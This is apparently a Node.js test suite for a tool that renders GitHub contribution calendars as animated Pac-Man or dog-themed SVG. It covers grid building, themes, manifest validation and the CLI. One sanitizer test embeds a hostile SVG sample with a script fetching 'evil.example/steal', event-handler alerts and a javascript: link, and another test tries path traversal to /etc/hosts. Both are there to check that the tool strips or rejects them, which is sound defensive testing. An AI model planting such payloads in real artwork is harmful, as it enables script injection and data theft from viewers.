#!/usr/bin/env node
/**
 * Test suite. No framework: `node scripts/test.js` after a build.
 *
 * The most important tests here are the Pac-Man ones. The theme layer was added
 * under an existing, working animation, so "the original skin still draws exactly
 * what it drew" is the property that must not rot — those tests pin the grid
 * counts, the timing and the actual markup Pac-Man and his ghosts emit.
 */

const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");

const { buildGrid } = require("../packages/grid/dist/index.js");
const { createSvg } = require("../packages/svg-creator/dist/index.js");
const theme = require("../packages/theme/dist/index.js");
const { generate, summarizeGrid } = require("../packages/generator/dist/index.js");
const { parseArgs, enumFlag, UsageError } = require("../packages/cli/dist/args.js");

const tests = [];
const test = (name, fn) => tests.push({ name, fn });

// ─── Fixture ─────────────────────────────────────────────────────────────────
// A fixed pseudo-random calendar, so grid counts are stable across runs.
function fixture() {
  let seed = 12345;
  const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
  const weeks = Array.from({ length: 52 }, () => ({
    contributionDays: Array.from({ length: 7 }, () => {
      const r = rnd();
      return { date: "2026-01-01", contributionCount: r < 0.45 ? 0 : Math.ceil(r * 12) };
    }),
  }));
  return { weeks, totalContributions: 1000, username: "fixture" };
}

const pacman = () => theme.loadTheme("pacman");
const dogs = () => theme.loadTheme("dogs");

// ─── Grid ────────────────────────────────────────────────────────────────────

test("grid shape and cell counts are unchanged", () => {
  const grid = buildGrid(fixture(), { bonusRate: 0.025 });
  assert.strictEqual(grid.cols, 52);
  assert.strictEqual(grid.rows, 7);
  assert.strictEqual(grid.path.length, 301);
  assert.deepStrictEqual(summarizeGrid(grid), { pellet: 203, floor: 93, wall: 63, bonus: 5 });
});

test("a bonus rate of 0 leaves every active day a pellet", () => {
  const counts = summarizeGrid(buildGrid(fixture(), { bonusRate: 0 }));
  assert.strictEqual(counts.bonus, undefined);
  assert.strictEqual(counts.pellet, 208);
});

test("omitting options behaves like a theme with no bonus item", () => {
  assert.deepStrictEqual(summarizeGrid(buildGrid(fixture())), summarizeGrid(buildGrid(fixture(), { bonusRate: 0 })));
});

test("every path step lands on a non-wall cell, and eats exactly the collectibles", () => {
  const grid = buildGrid(fixture(), { bonusRate: 0.025 });
  for (const step of grid.path) {
    const cell = grid.cells[step.col][step.row];
    assert.notStrictEqual(cell.cellType, "wall", `path steps onto a wall at ${step.col},${step.row}`);
    assert.strictEqual(step.eating, cell.cellType === "pellet" || cell.cellType === "bonus");
  }
  const eaten = new Set(grid.path.filter((s) => s.eating).map((s) => `${s.col},${s.row}`));
  const collectibles = grid.cells.flat().filter((c) => c.cellType === "pellet" || c.cellType === "bonus");
  assert.strictEqual(eaten.size, collectibles.length, "some collectibles are never reached");
});

test("consecutive path steps are adjacent, and the direction matches the move", () => {
  const grid = buildGrid(fixture(), { bonusRate: 0.025 });
  const delta = { right: [1, 0], left: [-1, 0], up: [0, -1], down: [0, 1] };
  for (let i = 1; i < grid.path.length; i++) {
    const from = grid.path[i - 1];
    const to = grid.path[i];
    const [dc, dr] = delta[to.direction];
    // DFS backtracks by re-entering an earlier cell, so only forward moves are
    // checked for adjacency; what must always hold is that a step never claims a
    // direction it did not travel.
    if (Math.abs(to.col - from.col) + Math.abs(to.row - from.row) === 1) {
      assert.strictEqual(to.col - from.col, dc, `step ${i} direction disagrees with its move`);
      assert.strictEqual(to.row - from.row, dr, `step ${i} direction disagrees with its move`);
    }
  }
});

// ─── Pac-Man: no regression ──────────────────────────────────────────────────

test("Pac-Man renders the same geometry, timing and colors as before the theme layer", () => {
  const grid = buildGrid(fixture(), { bonusRate: 0.025 });
  const svg = createSvg(grid, pacman(), { colorScheme: "dark" });

  assert.match(svg, /<title>GitHub Contributions — Pac-Man<\/title>/);
  assert.match(svg, /viewBox="0 0 872 152" width="872" height="152"/);
  assert.match(svg, /<rect width="872" height="152" fill="#0d1117" rx="6"\/>/);
  // 301 steps × 0.08s, kept as raw arithmetic so the timeline is bit-for-bit the same.
  assert.ok(svg.includes(`dur="${301 * 0.08}s"`), "step duration changed");

  // Pac-Man's chomp, rotating about the cell centre.
  assert.ok(svg.includes(`values="M7,7 L13,4 A6,6 0,1,0 13,10 Z;M7,7 L13,6.8 A6,6 0,1,0 13,7.2 Z;M7,7 L13,4 A6,6 0,1,0 13,10 Z"`));
  assert.match(svg, /type="rotate"\s+values="0,7,7;/);

  // One dot per pellet, one cherry per bonus, one wall and floor per inactive cell.
  const count = (re) => (svg.match(re) || []).length;
  assert.strictEqual(count(/<circle cx="7" cy="7" r="3\.5" fill="#FFD700">/g), 203);
  assert.strictEqual(count(/fill="#cc1100"/g), 5 * 6);
  assert.strictEqual(count(/fill="#0f1b3d"/g), 63);
  assert.strictEqual(count(/<rect x="2" y="2" width="10" height="10" rx="2" fill="#161b22"\/>/g), 93);

  // Four ghosts, in the original colors, trailing at 4/8/12/16 steps.
  for (const color of ["#FF0000", "#FFB8FF", "#FFD700", "#29ABE2"]) {
    assert.ok(svg.includes(`fill="${color}"`), `ghost color ${color} missing`);
  }
  assert.strictEqual(count(/attributeName="x" values="/g), 8, "expected two animated pupils per ghost");
});

test("Pac-Man's ghosts trail at the original offsets", () => {
  const grid = buildGrid(fixture(), { bonusRate: 0.025 });
  const svg = createSvg(grid, pacman(), {});
  const start = `${20 + grid.path[0].col * 16},${20 + grid.path[0].row * 16}`;

  const translates = [...svg.matchAll(/type="translate"\s+values="([^"]+)"/g)].map((m) => m[1].split(";"));
  assert.strictEqual(translates.length, 5, "expected Pac-Man plus four ghosts");

  // Followers are drawn before the leader, so Pac-Man is last in document order.
  const leader = translates[translates.length - 1];
  const ghosts = translates.slice(0, -1);
  ghosts.forEach((values, i) => {
    const offset = 4 * (i + 1);
    assert.strictEqual(values[offset - 1], start, `ghost ${i} left the start cell too early`);
    assert.strictEqual(values[offset + 5], leader[5], `ghost ${i} is not ${offset} steps behind`);
  });
});

test("single formation drops the ghosts and nothing else", () => {
  const grid = buildGrid(fixture(), { bonusRate: 0.025 });
  const train = createSvg(grid, pacman(), { formation: "train" });
  const single = createSvg(grid, pacman(), { formation: "single" });

  assert.ok(!single.includes(`fill="#FF0000"`), "ghosts survived a single-figure run");
  assert.ok(single.includes("M7,7 L13,4"), "Pac-Man is missing");
  assert.strictEqual((single.match(/type="translate"/g) || []).length, 1);
  assert.ok(single.length < train.length);
  // The grid is untouched by the formation choice.
  const cells = (svg) => svg.slice(0, svg.indexOf("<!-- Followers"));
  assert.strictEqual(cells(single), cells(train));
});

test("an empty calendar renders a bare background rather than throwing", () => {
  const grid = buildGrid({ weeks: [], totalContributions: 0, username: "x" });
  const svg = createSvg(grid, pacman(), {});
  assert.match(svg, /^<svg/);
  assert.ok(!svg.includes("animate"));
});

// ─── Themes ──────────────────────────────────────────────────────────────────

test("the dogs theme has no bonus item, so the grid grows no bonus cells", () => {
  const dogsTheme = dogs();
  assert.strictEqual(dogsTheme.collectibles.bonus, undefined);
  const grid = buildGrid(fixture(), { bonusRate: dogsTheme.collectibles.bonus?.rate ?? 0 });
  assert.strictEqual(summarizeGrid(grid).bonus, undefined);
});

test("file-based artwork is emitted once as a symbol and referenced per cell", () => {
  const dogsTheme = dogs();
  const grid = buildGrid(fixture());
  const svg = createSvg(grid, dogsTheme, { formation: "single" });

  const symbols = [...svg.matchAll(/<symbol id="([^"]+)"/g)].map((m) => m[1]);
  assert.deepStrictEqual(symbols.sort(), ["dogs-sprite-biscuit", "dogs-sprite-corgi_right"]);
  assert.strictEqual((svg.match(/<use href="#dogs-sprite-biscuit"/g) || []).length, 208);
  assert.match(svg, /xmlns:xlink="http:\/\/www\.w3\.org\/1999\/xlink"/);
});

test("unused figures cost nothing: a single run omits the followers' artwork", () => {
  const grid = buildGrid(fixture());
  const single = createSvg(grid, dogs(), { formation: "single" });
  const train = createSvg(grid, dogs(), { formation: "train" });

  assert.ok(!single.includes("shiba"), "a follower's artwork leaked into a single-figure run");
  assert.ok(train.includes("dogs-sprite-shiba_right"));
  assert.strictEqual((train.match(/<symbol /g) || []).length, 5);
});

test("a derived pose reuses its base symbol and only adds a mirror", () => {
  const svg = createSvg(buildGrid(fixture()), dogs(), { formation: "single" });
  assert.match(svg, /<g transform="translate\(14,0\) scale\(-1,1\)"><use href="#dogs-sprite-corgi_right"/);
  assert.strictEqual((svg.match(/<symbol id="dogs-sprite-corgi/g) || []).length, 1);
});

test("a chain of derivations keeps every transform along it", () => {
  const dir = writeTheme(
    {
      ...MINIMAL,
      sprites: {
        blob: MINIMAL.sprites.blob,
        hero: { file: "art/hero.svg" },
        mirrored: { from: "hero", flipX: true },
        smaller: { from: "mirrored", scale: 0.5 },
      },
      figures: { leader: { sprite: "smaller" } },
    },
    { "art/hero.svg": HERO_SVG }
  );
  const svg = createSvg(buildGrid(fixture()), theme.loadTheme(dir), {});
  // The mirror from the middle link must survive alongside the scale from the last.
  assert.match(svg, /transform="translate\(14,0\) scale\(-1,1\) translate\(3\.5,3\.5\) scale\(0\.5\)"/);
  assert.strictEqual((svg.match(/<symbol /g) || []).length, 1, "artwork was duplicated");
});

test("a figure with distinct poses cross-fades between them on the step clock", () => {
  const grid = buildGrid(fixture());
  const svg = createSvg(grid, dogs(), { formation: "single" });
  // A pose track holds one value per path step, which is what tells it apart from
  // the four-keyframe fade a collectible uses when it is eaten.
  const tracks = [...svg.matchAll(/<animate attributeName="opacity" values="([^"]+)"/g)]
    .map((m) => m[1].split(";").map(Number))
    .filter((values) => values.length === grid.path.length);
  assert.strictEqual(tracks.length, 2, "expected one opacity track per pose");
  for (let i = 0; i < grid.path.length; i++) {
    assert.strictEqual(tracks[0][i] + tracks[1][i], 1, `step ${i} shows ${tracks[0][i] + tracks[1][i]} poses`);
  }
});

test("rotating figures do not cross-fade, and non-rotating ones do not rotate", () => {
  const grid = buildGrid(fixture(), { bonusRate: 0.025 });
  assert.match(createSvg(grid, pacman(), { formation: "single" }), /type="rotate"/);
  assert.ok(!createSvg(grid, dogs(), { formation: "single" }).includes('type="rotate"'));
});

test("each theme's default formation is used when the caller does not choose", () => {
  assert.strictEqual(theme.chooseFormation(pacman()), "train");
  assert.strictEqual(theme.chooseFormation(dogs()), "single");
  assert.strictEqual(theme.chooseFormation(dogs(), "train"), "train");
  assert.throws(() => theme.chooseFormation(dogs(), "swarm"), /unknown formation/);
});

test("built-in themes are listed for the CLI", () => {
  const ids = theme.listBuiltinThemes().map((t) => t.id);
  assert.ok(ids.includes("pacman") && ids.includes("dogs"));
  for (const summary of theme.listBuiltinThemes()) {
    assert.ok(summary.name && summary.description, `${summary.id} is missing name or description`);
  }
});

test("discovery lists installed themes alongside the built-ins", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "git-pacman-themes-"));
  const dir = path.join(root, "anything");
  fs.mkdirSync(dir);
  fs.writeFileSync(path.join(dir, "theme.json"), JSON.stringify({ ...MINIMAL, id: "extra", name: "Extra" }));
  fs.mkdirSync(path.join(root, "not-a-theme"));

  const report = { warnings: [] };
  const found = theme.discoverThemes({ searchPaths: [root], report });
  const ids = found.map((t) => t.id);
  assert.deepStrictEqual(ids, ["extra", "pacman", "dogs"], "installed themes should come first");
  assert.strictEqual(found[0].source, dir, "an installed theme reports where it came from");

  // A directory without a manifest is skipped, not reported as broken.
  assert.deepStrictEqual(report.warnings, []);
});

test("discovery reports an unreadable manifest instead of throwing", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "git-pacman-themes-"));
  fs.mkdirSync(path.join(root, "broken"));
  fs.writeFileSync(path.join(root, "broken", "theme.json"), "{ not json");

  const report = { warnings: [] };
  const ids = theme.discoverThemes({ searchPaths: [root], report }).map((t) => t.id);
  assert.deepStrictEqual(ids, ["pacman", "dogs"]);
  assert.match(report.warnings.join(" "), /ignoring .*broken/);
});

test("the shipped example theme is valid and renders", () => {
  const found = theme.discoverThemes({ searchPaths: [path.join(__dirname, "..", "themes")] });
  const example = found.find((t) => t.id === "example-shapes");
  assert.ok(example, "themes/example-shapes is missing");

  const loaded = theme.loadTheme(example.source);
  const grid = buildGrid(fixture(), { bonusRate: loaded.collectibles.bonus?.rate ?? 0 });
  const svg = createSvg(grid, loaded, {});
  assert.match(svg, /<title>GitHub Contributions — Example Shapes<\/title>/);
  assert.strictEqual((svg.match(/type="translate"/g) || []).length, 4, "leader plus three followers");
  assert.ok(!svg.includes("<symbol"), "the example theme should need no file artwork");
});

// ─── Third-party themes ──────────────────────────────────────────────────────

/** Writes a theme directory and returns its path; the marketplace shape. */
function writeTheme(manifest, files = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "git-pacman-theme-"));
  fs.writeFileSync(path.join(dir, "theme.json"), JSON.stringify(manifest));
  for (const [name, content] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
    fs.writeFileSync(path.join(dir, name), content);
  }
  return dir;
}

const MINIMAL = {
  schemaVersion: 1,
  id: "test-theme",
  name: "Test Theme",
  sprites: {
    blob: { inline: `<circle cx="7" cy="7" r="5" fill="#abcdef">{{children}}</circle>` },
    hero: { file: "art/hero.svg" },
  },
  collectibles: { pellet: "blob" },
  figures: { leader: { sprite: "hero" } },
};

const HERO_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><rect width="40" height="40" fill="#123456"/></svg>`;

test("a theme loaded from a directory renders like a built-in one", () => {
  const dir = writeTheme(MINIMAL, { "art/hero.svg": HERO_SVG });
  const loaded = theme.loadTheme(dir);
  assert.strictEqual(loaded.id, "test-theme");
  assert.strictEqual(loaded.defaultFormation, "single");

  const svg = createSvg(buildGrid(fixture()), loaded, {});
  assert.match(svg, /<symbol id="test-theme-sprite-hero" viewBox="0 0 40 40"/);
  assert.match(svg, /fill="#abcdef"/);
  assert.match(svg, /<title>GitHub Contributions — Test Theme<\/title>/);
});

test("a theme id is found on the search path", () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "git-pacman-themes-"));
  const dir = path.join(root, "installed");
  fs.mkdirSync(dir);
  fs.writeFileSync(path.join(dir, "theme.json"), JSON.stringify({ ...MINIMAL, id: "installed", sprites: { blob: MINIMAL.sprites.blob }, figures: { leader: { sprite: "blob" } } }));
  assert.strictEqual(theme.loadTheme("installed", { searchPaths: [root] }).id, "installed");
  assert.throws(() => theme.loadTheme("installed", { searchPaths: [] }), /unknown theme/);
});

test("terrain is optional: a theme can leave inactive cells blank", () => {
  const dir = writeTheme({ ...MINIMAL, sprites: { blob: MINIMAL.sprites.blob }, figures: { leader: { sprite: "blob" } } });
  const svg = createSvg(buildGrid(fixture()), theme.loadTheme(dir), {});
  assert.ok(!svg.includes("#0f1b3d"), "walls were drawn by a theme with no terrain");
  assert.strictEqual((svg.match(/fill="#abcdef"/g) || []).length, 208 + 1);
});

test("layout is a theme's to choose", () => {
  const dir = writeTheme({
    ...MINIMAL,
    sprites: { blob: MINIMAL.sprites.blob },
    figures: { leader: { sprite: "blob" } },
    layout: { cellSize: 20, cellGap: 4, padding: 10, stepDuration: 0.2 },
    background: { dark: "#000000" },
  });
  const grid = buildGrid(fixture());
  const svg = createSvg(buildGrid(fixture()), theme.loadTheme(dir), {});
  assert.match(svg, /width="1268" height="188"/); // 52×24+20, 7×24+20
  assert.ok(svg.includes(`dur="${grid.path.length * 0.2}s"`));
  assert.match(svg, /fill="#000000"/);
});

// ─── Manifest validation ─────────────────────────────────────────────────────

const rejects = [
  ["an unsupported schema version", { ...MINIMAL, schemaVersion: 2 }, /schemaVersion/],
  ["a missing id", { ...MINIMAL, id: "" }, /"id" must be a name/],
  ["a collectible naming an unknown sprite", { ...MINIMAL, collectibles: { pellet: "nope" } }, /unknown sprite "nope"/],
  ["a bonus rate above 1", { ...MINIMAL, collectibles: { pellet: "blob", bonus: { sprite: "blob", rate: 12 } } }, /between 0 and 1/],
  ["a figure with no sprite", { ...MINIMAL, figures: { leader: {} } }, /must set "sprite" or "sprites"/],
  ["a missing leader", { ...MINIMAL, figures: {} }, /figures.leader" is required/],
  ["a negative offset", { ...MINIMAL, figures: { leader: { sprite: "blob" }, followers: [{ sprite: "blob", offset: -3 }] } }, /whole number of steps/],
  ["a leader that trails its own path", { ...MINIMAL, figures: { leader: { sprite: "blob", offset: 4 } } }, /leader\.offset must be 0/],
  ["a sprite with two sources", { ...MINIMAL, sprites: { blob: { inline: "<g/>", file: "a.svg" } } }, /exactly one of/],
  ["a circular derivation", { ...MINIMAL, sprites: { blob: { from: "other" }, other: { from: "blob" } } }, /derives from itself/],
  ["a negative cell size", { ...MINIMAL, layout: { cellSize: -1 } }, /positive number/],
];

for (const [what, manifest, pattern] of rejects) {
  test(`a manifest is rejected for ${what}`, () => {
    const dir = writeTheme(manifest, { "art/hero.svg": HERO_SVG });
    assert.throws(() => theme.loadTheme(dir), pattern);
  });
}

test("a sprite file cannot escape its theme directory", () => {
  const dir = writeTheme({
    ...MINIMAL,
    sprites: { blob: MINIMAL.sprites.blob, hero: { file: "../../../etc/hosts" } },
  });
  assert.throws(() => theme.loadTheme(dir), /escapes the theme directory|must be an \.svg/);

  const absolute = writeTheme({
    ...MINIMAL,
    sprites: { blob: MINIMAL.sprites.blob, hero: { file: "/etc/hosts" } },
  });
  assert.throws(() => theme.loadTheme(absolute), /must be relative/);
});

test("a sprite referencing an undefined placeholder fails with a useful message", () => {
  const dir = writeTheme({
    ...MINIMAL,
    sprites: { blob: { inline: `<circle fill="{{missing}}"/>` } },
    figures: { leader: { sprite: "blob" } },
  });
  assert.throws(
    () => createSvg(buildGrid(fixture()), theme.loadTheme(dir), {}),
    /references \{\{missing\}\}/
  );
});

test("a figure's vars fill its sprite's placeholders", () => {
  const dir = writeTheme({
    ...MINIMAL,
    sprites: { blob: { inline: `<circle cx="7" cy="7" r="5" fill="{{coat}}"/>` } },
    collectibles: { pellet: "blob" },
    figures: { leader: { sprite: "blob", vars: { coat: "#00ff00" } } },
  });
  assert.throws(() => createSvg(buildGrid(fixture()), theme.loadTheme(dir), {}), /references \{\{coat\}\}/);
});

// ─── Artwork sanitizing ──────────────────────────────────────────────────────

test("active content is stripped from third-party artwork", () => {
  const hostile = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">
    <script>fetch("https://evil.example/steal")</script>
    <rect width="10" height="10" onclick="alert(1)" onload="alert(2)" fill="red"/>
    <image href="https://evil.example/track.png" width="10" height="10"/>
    <foreignObject><body xmlns="http://www.w3.org/1999/xhtml">hi</body></foreignObject>
    <a href="javascript:alert(3)"><rect width="1" height="1"/></a>`;
  const dir = writeTheme({ ...MINIMAL, sprites: { blob: MINIMAL.sprites.blob, hero: { file: "art/hero.svg" } } }, { "art/hero.svg": hostile });

  const report = { warnings: [] };
  const svg = createSvg(buildGrid(fixture()), theme.loadTheme(dir, { report }), {});

  for (const forbidden of ["<script", "onclick", "onload", "evil.example", "foreignObject", "javascript:"]) {
    assert.ok(!svg.includes(forbidden), `sanitizer let through: ${forbidden}`);
  }
  assert.ok(svg.includes(`fill="red"`), "the drawing itself was thrown away");
  assert.ok(report.warnings.length > 0, "nothing was reported to the user");
});

test("artwork ids are namespaced so two sprites cannot collide", () => {
  const withIds = (color) => `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">
    <defs><linearGradient id="paint"><stop stop-color="${color}"/></linearGradient></defs>
    <style>.body { stroke: ${color} }</style>
    <rect class="body" width="10" height="10" fill="url(#paint)"/></svg>`;

  const dir = writeTheme(
    {
      ...MINIMAL,
      sprites: { blob: MINIMAL.sprites.blob, hero: { file: "art/hero.svg" }, rival: { file: "art/rival.svg" } },
      figures: { leader: { sprite: "hero" }, followers: [{ sprite: "rival" }] },
    },
    { "art/hero.svg": withIds("#111111"), "art/rival.svg": withIds("#222222") }
  );

  const svg = createSvg(buildGrid(fixture()), theme.loadTheme(dir), { formation: "train" });
  assert.match(svg, /id="test-theme-sprite-hero-paint"/);
  assert.match(svg, /id="test-theme-sprite-rival-paint"/);
  assert.match(svg, /fill="url\(#test-theme-sprite-hero-paint\)"/);
  // CSS is scoped to the sprite that declared it.
  assert.match(svg, /#test-theme-sprite-hero \.body \{/);
  assert.ok(!svg.includes(`id="paint"`), "an un-prefixed id survived");
});

test("angle brackets in CSS are neutralized and reported, not silently rewritten", () => {
  const report = { warnings: [] };
  const cleaned = theme.sanitizeSvgMarkup(`<style>.a > .b { fill: red }</style>`, "p", "#p", report);
  assert.ok(!cleaned.includes(">.b") && !cleaned.includes("> .b"));
  assert.match(report.warnings.join(" "), /angle brackets/);
});

test("markup that cannot have children keeps its closing tags", () => {
  // SVG is XML: <circle> wrapping an <animate> is ordinary and must survive.
  const cleaned = theme.sanitizeSvgMarkup(`<circle cx="1"><animate attributeName="r" values="1;2"/></circle>`, "p");
  assert.strictEqual(cleaned, `<circle cx="1"><animate attributeName="r" values="1;2"/></circle>`);
});

test("malformed artwork is balanced instead of breaking the document around it", () => {
  const report = { warnings: [] };
  const cleaned = theme.sanitizeSvgMarkup(`</g><g><rect width="1" height="1"/>`, "p", undefined, report);
  assert.strictEqual(cleaned, `<g><rect width="1" height="1"/></g>`);
  assert.strictEqual(report.warnings.length, 2);
});

test("a viewBox is read from the artwork, or from its width and height", () => {
  assert.strictEqual(theme.parseSvgDocument(`<svg viewBox="0 0 5 9"><g/></svg>`).viewBox, "0 0 5 9");
  assert.strictEqual(theme.parseSvgDocument(`<svg width="212" height="164"><g/></svg>`).viewBox, "0 0 212 164");
  assert.strictEqual(theme.parseSvgDocument(`<circle r="1"/>`).viewBox, undefined);
});

test("content outside the root svg is dropped and reported", () => {
  // The shape a hand-edited "flipped" export takes: the wrapper never made it inside.
  const report = { warnings: [] };
  const parsed = theme.parseSvgDocument(
    `<?xml version="1.0"?><g transform="scale(-1,1)"><svg width="10" height="10"><rect width="1" height="1"/></g></svg>`,
    report
  );
  assert.ok(!parsed.inner.includes("scale(-1,1)"));
  assert.match(report.warnings.join(" "), /before the root <svg>/);
});

test("every shipped dog sprite is valid, balanced SVG", () => {
  const dir = path.join(theme.findAssetsRoot(), "doggie-kit", "sprites");
  for (const name of fs.readdirSync(dir).filter((n) => n.endsWith(".svg"))) {
    const report = { warnings: [] };
    const parsed = theme.parseSvgDocument(fs.readFileSync(path.join(dir, name), "utf8"), report);
    theme.sanitizeSvgMarkup(parsed.inner, "t", undefined, report);
    assert.deepStrictEqual(report.warnings, [], `${name} is malformed: ${report.warnings.join("; ")}`);
    assert.ok(parsed.viewBox, `${name} declares no size`);
  }
});

// ─── Pipeline and CLI ────────────────────────────────────────────────────────

test("the pipeline takes the bonus rate from the theme", async () => {
  const asDogs = await generate({ contributions: fixture(), theme: "dogs" });
  const asPacman = await generate({ contributions: fixture(), theme: "pacman" });
  assert.strictEqual(summarizeGrid(asDogs.grid).bonus, undefined);
  assert.strictEqual(summarizeGrid(asPacman.grid).bonus, 5);
  assert.strictEqual(asDogs.formation, "single");
  assert.strictEqual(asPacman.formation, "train");
});

test("the pipeline needs no token when given a calendar", async () => {
  const result = await generate({ contributions: fixture() });
  assert.strictEqual(result.theme.id, "pacman");
  assert.match(result.svg, /^<\?xml/);
});

test("the pipeline reports a missing token clearly", async () => {
  await assert.rejects(generate({ username: "someone" }), /token is required/);
  await assert.rejects(generate({ token: "x" }), /username is required/);
});

test("an unknown theme names the ones that exist", async () => {
  await assert.rejects(generate({ contributions: fixture(), theme: "cats" }), /unknown theme "cats".*pacman, dogs/s);
});

test("CLI flags parse, including = form, aliases and repeats", () => {
  const specs = [
    { name: "out", short: "o", help: "" },
    { name: "theme-path", repeatable: true, help: "" },
    { name: "quiet", short: "q", boolean: true, help: "" },
  ];
  const { flags } = parseArgs(["-o", "a.svg", "--theme-path=x", "--theme-path", "y", "-q"], specs);
  assert.deepStrictEqual(flags, { out: "a.svg", "theme-path": ["x", "y"], quiet: true });

  assert.throws(() => parseArgs(["--nope"], specs), UsageError);
  assert.throws(() => parseArgs(["--out"], specs), /needs a value/);
  assert.strictEqual(enumFlag("TRAIN", ["single", "train"], "formation"), "train");
  assert.throws(() => enumFlag("swarm", ["single", "train"], "formation"), /must be one of/);
});

// ─── Runner ──────────────────────────────────────────────────────────────────

(async () => {
  let failed = 0;
  for (const { name, fn } of tests) {
    try {
      await fn();
      process.stdout.write(`  ✓ ${name}\n`);
    } catch (err) {
      failed++;
      process.stdout.write(`  ✗ ${name}\n      ${(err && err.message ? err.message : String(err)).split("\n").join("\n      ")}\n`);
    }
  }
  process.stdout.write(`\n${tests.length - failed}/${tests.length} passed\n`);
  process.exit(failed === 0 ? 0 : 1);
})();
